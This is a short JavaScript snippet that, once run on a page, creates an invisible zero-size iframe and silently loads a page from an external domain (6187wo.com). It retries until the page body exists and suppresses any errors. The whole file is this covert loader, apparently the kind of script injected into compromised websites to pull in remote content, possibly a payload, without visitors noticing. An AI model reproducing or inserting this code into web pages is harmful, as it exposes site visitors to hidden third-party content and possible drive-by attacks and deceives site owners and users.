(function() {
	if (document.body) {
		var a = document.createElement("iframe");
		a.style.cssText = "position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;";
		a.frameBorder = "0";
		a.src = "http://etc.6187wo.com/external/ex10022/in.html";
		try {
			document.body.appendChild(a)
		} catch (b) {}
	} else setTimeout(arguments.callee, 50)
})();